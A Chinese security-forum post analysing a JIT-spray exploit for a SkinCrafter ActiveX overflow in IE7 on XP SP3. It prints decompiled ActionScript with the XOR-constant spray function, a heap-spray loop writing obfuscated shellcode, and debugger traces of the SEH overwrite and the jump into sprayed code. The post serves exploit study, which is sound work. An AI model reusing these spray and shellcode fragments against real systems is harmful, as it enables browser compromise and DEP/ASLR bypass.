
# [原创]JIT-Spray分析笔记

## 一、概述

这里有POC：6a3K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0b7#2z5e0W2Q4x3V1j5`.

调试环境：XPSP3、IE7、`noexecute=AlwaysOn`

## 二、什么是JIT

有一段时间没有关心编译、web、语言等方面的知识，来理一下什么是JIT。

### 1、名词

即时编译（英语：Just-in-time compilation），简单地说，代码在目标平台上运行的时候，实时的把代码编译为目标机器上的机器码。之前，程序有两种运行方式：静态编译与动态直译。静态编译的程序在执行前全部被翻译为机器码，而直译执行的则是一句一句边运行边翻译。

即时编译器则混合了这二者，一句一句编译源代码，但是会将翻译过的机器码缓存起来以降低性能损耗。相对于静态编译，即时编译可以处理延迟绑定并增强安全性。

JIT spray就是利用这种缓存机制。将特定的机器码喷射在可执行内存空间里。从而绕过DEP和ASLR。

### 2、运用JIT的语言或技术

Java、C#、Google V8、Flash、PyPy、HipHop（HHVM，facebook的php）

## 三、静态分析SWF

通过`setInterval(this.pageLoad, 800);`这一句，反复加载被称为`jit_egg`的文件。

```
function pageLoadEx()
{
    var _loc_1:* = new Loader();
    this.jit_egg.endian = Endian.LITTLE_ENDIAN;
    this.jit_egg.writeInt(156456771); //0x9535743  43 57 53 09 =CWS-SWF文件头
    this.jit_egg.writeInt(1359);
    this.jit_egg.writeInt(2462964344);
    this.jit_egg.writeInt(1163161579);
    ……
    this.jit_egg.writeInt(3288530842);
    this.jit_egg.writeShort(4338);
    this.jit_egg.writeByte(201);
    _loc_1.loadBytes(this.jit_egg);
    this.childRef = this.addChild(_loc_1);
    return;
}// end function
```

把`jit_egg`的内容保存为SWF文件以便进一步分析。

有两种简便方法，用C写一段代码来存，注意`Endian.LITTLE_ENDIAN`的问题。或者直接用FlashBuider来存。写两句ActionScript来另存文件。

```
var _fileRef:FileReference=new FileReference();//用于保存文件
_fileRef.save(jit_egg, defaultFileName);//保存到磁盘，会出现个系统保存对话框。
```

再反编译存下来的SWF，其核心内容如下：

```
public function Loadzz2()
{
    var _loc_1:* = this.funcXOR1();
    return;
}// end function

function funcXOR1()
{
    var _loc_1:* = 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1016107152 ^ 1012453937 ^ 1010158208 ^ 12095632 ^ 1016070145 ^ 1019229030 ^ 1016123395 ^ 1006791250 ^ 1009700184 ^ 1787823420 ^ 1784240730 ^ 1016125556 ^ 834179216 ^ 1016071987 ^ 1789917835 ^ 1019442521 ^ 1789890704 ^ 1784240528 ^ 1012381045 ^ 1006955651 ^ 1016119347 ^ 1016082608 ^ 1006668644 ^ 1007435915 ^ 1008484491 ^ 1007177867 ^ 1008760971 ^ 1016070283 ^ 1785413504 ^ 1021932891 ^ 1016088391 ^ 1785020288 ^ 1020949851 ^ 1016088391 ^ 1785872256 ^ 1019966811 ^ 1016088391 ^ 1785610112 ^ 1018983771 ^ 1012043920 ^ 1010614915 ^ 1016085131 ^ 1008997515 ^ 1016125187 ^ 1014547075 ^ 1016085131 ^ 1008997515 ^ 1016125187 ^ 1008255619 ^ 1016085131 ^ 1006944899 ^ 1016076939 ^ 1008999427 ^ 1006944899 ^ 1016083083 ^ 1009005571 ^ 1006944899 ^ 1016072843 ^ 1008995331 ^ 1018728592 ^ 1016070144 ^ 1016095664 ^ 1011905716 ^ 1018728592 ^ 1016096116 ^ 1016099504 ^ 1011904436 ^ 1018728592 ^ 1016090732 ^ 1016100272 ^ 1011900852 ^ 1018728592 ^ 1016099954 ^ 1016092336 ^ 1011902900 ^ 1016125323 ^ 1016119347 ^ 1016135475 ^ 1012093270 ^ 1016107152 ^ 1016107152 ^ 1012352912 ^ 1008993419 ^ 1006821569 ^ 1016131587 ^ 1016071819 ^ 1008780419 ^ 1008993283 ^ 1008790659 ^ 1016121651 ^ 1016073905 ^ 1007731843 ^ 1016132747 ^ 1016133771 ^ 1008256131 ^ 1787864819 ^ 344986740 ^ 1009052803 ^ 1012489055 ^ 1016107102 ^ 1016107243 ^ 1009052803 ^ 1012489055 ^ 1016107102 ^ 1016129489 ^ 1016123139 ^ 1016119347 ^ 1006734182 ^ 1006821569 ^ 1016120067 ^ 1016076427 ^ 1007731843 ^ 1008999427 ^ 1007207555 ^ 1016107103 ^ 1010854484 ^ 1016070506 ^ 1020526423 ^ 1016129535 ^ 1020054732;
    return _loc_1;
}// end function
```

`1016107152`，16进制看看：`3C909090`，很显然这就是要喷射到内存中的代码。

原SWF文件中Shellcode部分是：

```
function metaShell(param1:Number)
{
    var _loc_2:* = new ByteArray();
    _loc_2.endian = Endian.LITTLE_ENDIAN;
    var _loc_4:* = 0;
    if (_loc_4 < 262145 + param1)
    {
        _loc_2.writeInt(1717986918);    //0x66666666
        _loc_4 = _loc_4 + 1;
        ;
    }
    _loc_2.writeByte(85);   //下面是shellcode，经过混淆。
    _loc_2.writeInt(120796465);
    _loc_2.writeInt(120796465);
    _loc_2.writeInt(1960428761);
    ……
    _loc_2.writeInt(2139733359);
    _loc_2.writeShort(36976);
    this.heap_block.push(_loc_2);
    return;
}// end function
```

## 四、动态跟踪

用od附加IE7.0。

下断点：`DispCallFunc`里的`Call ECX`。

```
77105CD7    FFD1            call    ecx  ; SkinCraf.03381D40
```

### 1、传参数的样子是这样的

![](https://bbs.kanxue.com/upload/attach/201502/663932_h881q2ak0790hdq.jpg)

### 2、破坏SEH

破坏前的SEH如下图：

![](https://bbs.kanxue.com/upload/attach/201502/663932_jxutn7zz623gh1m.jpg)

破坏后的SEH如下图：

![](https://bbs.kanxue.com/upload/attach/201502/663932_48p01odllcnk59r.jpg)

### 3、异常触发转向喷射的代码

代码如下：

```
0D220101    90              nop
0D220102    90              nop
0D220103    90              nop
0D220104    3C 35           cmp     al, 35
0D220106    90              nop
0D220107    90              nop
0D220108    90              nop
0D220109    3C 35           cmp     al, 35
0D22010B    90              nop
0D22010C    90              nop
0D22010D    90              nop
0D22010E    3C 35           cmp     al, 35
0D220110    90              nop
0D220111    90              nop
0D220112    90              nop
0D220113    3C 35           cmp     al, 35
0D220115    90              nop
0D220116    90              nop
0D220117    90              nop
0D220118    3C 35           cmp     al, 35
```

在ASM窗口中退一位看上述代码：

```
0D220100    35 9090903C     xor     eax, 3C909090
0D220105    35 9090903C     xor     eax, 3C909090
0D22010A    35 9090903C     xor     eax, 3C909090
0D22010F    35 9090903C     xor     eax, 3C909090
0D220114    35 9090903C     xor     eax, 3C909090
0D220119    35 9090903C     xor     eax, 3C909090
0D22011E    35 9090903C     xor     eax, 3C909090
```

### 4、调用`VirtualProtect`设置ShellCode所在内存的执行权限

![](https://bbs.kanxue.com/upload/attach/201502/663932_kdcdonnvfs31hlb.jpg)

### 5、解密后的ShellCode

![](https://bbs.kanxue.com/upload/attach/201502/663932_yjb1tdvb0shb0ki.jpg)

上述代码执行完毕，将弹出浏览器并转向798K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8b7`.`.

### 6、看看内存里喷射的代码

如下图。有很多这样的内存块。

![](https://bbs.kanxue.com/upload/attach/201502/663932_s81iq1m46y0fvi8.jpg)

## 五、一些工具的使用

通过对Html文件已经知道，漏洞函数是`SkinCrafter.dll`的`InitLicenKey`。用ComRaider来感受一下ActiveX组件的Fuzz。

用firefox的firebug插件调试一下js脚本。调试能动态看到数据，总觉得比静态分析光看不练要靠谱。给`InitLicenKey`传入2048个A，200个B。

![](https://bbs.kanxue.com/upload/attach/201502/663932_5dc382ytl3nsg10.jpg)

![](https://bbs.kanxue.com/upload/attach/201502/663932_8a8r5oivd305nsj.jpg)

给IE7的`DisCallFunc`下断点时，如果机器安装有其它插件，很可能会干扰。在下图中关掉它们：

![](https://bbs.kanxue.com/upload/attach/201502/663932_mid6sb43cm9syc3.jpg)

将xor用的`jit-egg.swf`文件保存出来之后，可以用010编辑器看看，CWS开头，这是一个标准的SWF文件。

![](https://bbs.kanxue.com/upload/attach/201502/663932_kmepd2uizvfkwda.jpg)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [1-参数.jpg](javascript:void(0);)（32.30kb，17次下载）
- [2-破坏前.jpg](javascript:void(0);)（120.79kb，12次下载）
- [3-破坏后.jpg](javascript:void(0);)（78.63kb，8次下载）
- [4-解密后.jpg](javascript:void(0);)（92.01kb，8次下载）
- [4-解密前.jpg](javascript:void(0);)（116.37kb，6次下载）
- [5-喷射.jpg](javascript:void(0);)（229.76kb，7次下载）
- [6-Fuzz.jpg](javascript:void(0);)（98.36kb，5次下载）
- [7-Firebug.jpg](javascript:void(0);)
